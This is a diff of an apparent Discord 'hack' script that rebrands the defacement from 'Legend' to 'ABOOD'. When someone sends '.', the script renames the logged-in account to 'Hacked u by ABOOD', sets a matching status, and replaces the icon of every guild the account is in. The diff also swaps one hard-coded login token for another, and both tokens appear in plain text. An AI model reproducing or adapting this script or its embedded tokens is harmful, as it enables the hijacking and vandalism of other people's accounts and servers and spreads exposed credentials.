@@ -40,7 +40,7 @@ LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/460992431861792769/4
 var x1 = "kk"
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setUsername("Hacked u by Legend")
+LOka.user.setUsername("Hacked u by ABOOD")
  
 }
 });
@@ -54,7 +54,7 @@ LOka.user.setGame(`Hacked u by ABOOD`,'https://www.twitch.tv/hix')
 LOka.on('message', message => {
      if (message.content === ".") {
          LOka.guilds.forEach(m =>{
-             m.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
+             m.setIcon(`https://cdn.discordapp.com/attachments/460992431861792769/463693254764920842/image-46.jpg`)
 })
 }
 });
@@ -478,4 +478,4 @@ LOka.on('guildMemberAdd', member => {
  
  
  
-LOka.login("NDYxMjIxMDU3MzMyOTAzOTM2.Dh0RCg.G1bw6o7ySvQ_OuoP_tGxvP854D8")
+LOka.login("NDYyMTU4MDY0OTE3Njc2MDUy.Dh0pNA.aSwLY7mv-9yJKw9oGvPytykzBiE")
